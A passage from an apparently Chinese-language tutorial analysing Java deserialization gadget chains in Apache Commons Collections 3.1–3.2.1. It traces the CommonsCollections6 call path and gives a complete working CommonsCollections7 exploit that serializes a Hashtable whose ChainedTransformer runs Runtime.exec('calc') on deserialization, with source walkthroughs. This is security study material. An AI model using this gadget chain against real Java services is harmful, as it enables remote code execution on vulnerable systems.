        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read capacity and verify non-negative.
        int capacity = s.readInt();
        if (capacity < 0) {
            throw new InvalidObjectException("Illegal capacity: " +
                                             capacity);
        }

        // Read load factor and verify positive and non NaN.
        float loadFactor = s.readFloat();
        if (loadFactor <= 0 || Float.isNaN(loadFactor)) {
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        }

        // Read size and verify non-negative.
        int size = s.readInt();
        if (size < 0) {
            throw new InvalidObjectException("Illegal size: " +
                                             size);
        }
        // Set the capacity according to the size and load factor ensuring that
        // the HashMap is at least 25% full but clamping to maximum capacity.
        capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),
                HashMap.MAXIMUM_CAPACITY);

        // Constructing the backing map will lazily create an array when the first element is
        // added, so check it before construction. Call HashMap.tableSizeFor to compute the
        // actual allocation size. Check Map.Entry[].class since it's the nearest public type to
        // what is actually created.

        SharedSecrets.getJavaOISAccess()
                     .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));

        // Create backing HashMap
        map = (((HashSet<?>)this) instanceof LinkedHashSet ?
               new LinkedHashMap<E,Object>(capacity, loadFactor) :
               new HashMap<E,Object>(capacity, loadFactor));

        // Read in all elements in the proper order.
        for (int i=0; i<size; i++) {
            @SuppressWarnings("unchecked")
                E e = (E) s.readObject();
            map.put(e, PRESENT);//1
        }
    }
```

程序在反序列化时，在注释1处，执行HashMap.put()

#### HashMap

```java
    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);//1
    }
```

程序在注释1处执行TiedMapEntry.hashCode()

#### TiedMapEntry

```java
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
    public Object getValue() {
        return this.map.get(this.key);//1
    }
```

程序在注释1处触发LazyMap.get()。

#### LazyMap

```java
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);//1
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```

程序在注释1处会执行我们恶意构造的payload。

### 问题补充

#### lazyMap.remove("cc6")

Q1：

为何要把cc6删除掉

A1：

主要和LazyMap有关

```java
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {//1
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);//2
        }
    }
```

如果不删除则会执行注释2，这样就触发不了payload。

Q2：

cc6这个值是在哪里赋值给lazyMap的呢？

A2：

在hashSet.add(tiedMapEntry)，这个过程和Exp利用链基本一样。

```java
    //HashSet
	public boolean add(E e) {
        return map.put(e, PRESENT)==null;
    }
	//HashMap
    public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }

	//.......和Exp利用链相同

	//ChainedTransformer
    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;//1
    }
```

因为`Transformer Testtransformer = new ChainedTransformer(new Transformer[]{})`​，所以注释1处返回cc6。

因此lazyMap有一个键值对"cc6"->"cc6"。

#### Testtransformer

Q：

为何要先用`Testtransformer`​构造，再用反射更改`iTransformers`​。

A：

否则会在反序列化之前触发payload，导致程序中止。

## CommonsCollections7

### 版本适用范围

commons-collections : 3.1～3.2.1

### Exp展示

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        Transformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[]{}}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Map map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,chainedTransformer);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"cc7");

        Hashtable hashtable = new Hashtable();
        hashtable.put(tiedMapEntry, "cc7");
        lazyMap.remove("cc7");

        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,transformers);

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("cc7.out"));
        objectOutputStream.writeObject(hashtable);
        objectOutputStream.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("cc7.out"));
        objectInputStream.readObject();

    }
}
```

### Exp构造分析

#### 利用链展示

```java
Hashtable.readObject()/Hashtable.reconstitutionPut()
    TiedMapEntry.hashCode()/TiedMapEntry.getValue()
        LazyMap.get()
           ChainedTransformer.transform()
               InvokerTransformer.transform()
```

#### Hashtable

```java
    private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();//2
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }

    private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the threshold and loadFactor
        s.defaultReadObject();

        // Validate loadFactor (ignore threshold - it will be re-computed)
        if (loadFactor <= 0 || Float.isNaN(loadFactor))
            throw new StreamCorruptedException("Illegal Load: " + loadFactor);

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Validate # of elements
        if (elements < 0)
            throw new StreamCorruptedException("Illegal # of Elements: " + elements);

        // Clamp original length to be more than elements / loadFactor
        // (this is the invariant enforced with auto-growth)
        origlength = Math.max(origlength, (int)(elements / loadFactor) + 1);

        // Compute new length with a bit of room 5% + 3 to grow but
        // no larger than the clamped original length.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)((elements + elements / 20) / loadFactor) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        length = Math.min(length, origlength);

        if (length < 0) { // overflow
            length = origlength;
        }

        // Check Map.Entry[].class since it's the nearest public type to
        // what we're actually creating.
        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length);
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // sync is eliminated for performance
            reconstitutionPut(table, key, value); //1
        }
    }
```

CommonsCollections7和6的区别主要是使用了Hashtable，代码关键在于注释1和2处。
